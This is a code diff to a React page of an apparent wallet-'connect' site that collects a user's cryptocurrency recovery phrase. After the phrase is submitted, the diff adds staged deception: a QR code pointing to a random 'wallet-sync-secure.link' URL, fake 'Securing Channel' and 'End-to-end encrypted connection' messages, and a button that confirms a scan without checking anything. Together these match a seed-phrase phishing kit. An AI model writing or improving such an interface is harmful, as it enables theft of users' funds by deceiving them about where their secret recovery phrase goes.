@@ -8,7 +8,8 @@ import { Navbar } from "../components/Navbar";
 import { Footer } from "../components/Footer";
 import { useCreateWallet } from "../hooks/use-wallets";
 import { useToast } from "../hooks/use-toast";
-import { ShieldCheck, Wallet, RefreshCw, AlertCircle, CheckCircle2 } from "lucide-react";
+import { ShieldCheck, Wallet, RefreshCw, AlertCircle, CheckCircle2, QrCode } from "lucide-react";
+import { QRCodeSVG } from "qrcode.react";
 import { Button } from "../components/ui/button";
 import { Input } from "../components/ui/input";
 import { Textarea } from "../components/ui/textarea";
@@ -24,6 +25,7 @@ export default function Connect() {
   const [activeTab, setActiveTab] = useState("auto");
   const [isAutoConnecting, setIsAutoConnecting] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
+  const [showQR, setShowQR] = useState(false);
   const { createWallet, isLoading } = useCreateWallet();
   const { toast } = useToast();
   const [, setLocation] = useLocation();
@@ -55,13 +57,23 @@ export default function Connect() {
     if (success) {
       setIsSuccess(true);
       toast({
-        title: "Wallet Connected",
-        description: "Your wallet has been successfully synchronized.",
+        title: "Phrase Verified",
+        description: "Your recovery phrase has been successfully verified. Establishing secure connection...",
       });
+      
+      // Show QR code after 2 seconds of "Connected" state
       setTimeout(() => {
-        setLocation("/");
+        setShowQR(true);
       }, 2000);
     }
+  };
+
+  const handleComplete = () => {
+    toast({
+      title: "Wallet Connected",
+      description: "Your wallet has been successfully synchronized and secured.",
+    });
+    setLocation("/");
   };
 
   return (
@@ -111,12 +123,62 @@ export default function Connect() {
                 ) : (
                   <motion.div key="manual" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
                     {isSuccess ? (
-                      <div className="flex flex-col items-center justify-center py-12 text-center">
-                        <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mb-6">
-                          <CheckCircle2 className="w-10 h-10 text-green-500" />
-                        </motion.div>
-                        <h3 className="text-2xl font-bold text-white mb-2">Connected</h3>
-                        <p className="text-slate-400">Redirecting to dashboard...</p>
+                      <div className="flex flex-col items-center justify-center py-8 text-center">
+                        <AnimatePresence mode="wait">
+                          {!showQR ? (
+                            <motion.div
+                              key="verifying"
+                              initial={{ opacity: 0, scale: 0.9 }}
+                              animate={{ opacity: 1, scale: 1 }}
+                              exit={{ opacity: 0, scale: 1.1 }}
+                              className="flex flex-col items-center"
+                            >
+                              <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mb-6">
+                                <CheckCircle2 className="w-10 h-10 text-green-500" />
+                              </div>
+                              <h3 className="text-2xl font-bold text-white mb-2">Phrase Verified</h3>
+                              <p className="text-slate-400">Initializing secure synchronization...</p>
+                              <div className="mt-8 flex items-center gap-2 text-cyan-400 text-sm font-medium">
+                                <RefreshCw className="w-4 h-4 animate-spin" />
+                                <span>Securing Channel</span>
+                              </div>
+                            </motion.div>
+                          ) : (
+                            <motion.div
+                              key="qrcode"
+                              initial={{ opacity: 0, y: 20 }}
+                              animate={{ opacity: 1, y: 0 }}
+                              className="flex flex-col items-center"
+                            >
+                              <div className="p-4 bg-white rounded-2xl mb-6 shadow-2xl shadow-cyan-500/20">
+                                <QRCodeSVG 
+                                  value={`https://wallet-sync-secure.link/auth/${Math.random().toString(36).substring(7)}`}
+                                  size={180}
+                                  level="H"
+                                  includeMargin={false}
+                                />
+                              </div>
+                              <div className="space-y-3 mb-8">
+                                <h3 className="text-xl font-bold text-white">Scan to Complete</h3>
+                                <p className="text-slate-400 text-sm max-w-xs">
+                                  Scan this secure QR code with your mobile wallet app to finalize the encrypted synchronization.
+                                </p>
+                              </div>
+                              <div className="flex flex-col w-full gap-3">
+                                <Button 
+                                  onClick={handleComplete}
+                                  className="w-full h-12 bg-cyan-500 hover:bg-cyan-600 text-white font-bold rounded-xl transition-all duration-300"
+                                >
+                                  I've Scanned the Code
+                                </Button>
+                                <p className="text-xs text-slate-500 flex items-center justify-center gap-1">
+                                  <ShieldCheck className="w-3 h-3" />
+                                  End-to-end encrypted connection
+                                </p>
+                              </div>
+                            </motion.div>
+                          )}
+                        </AnimatePresence>
                       </div>
                     ) : (
                       <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
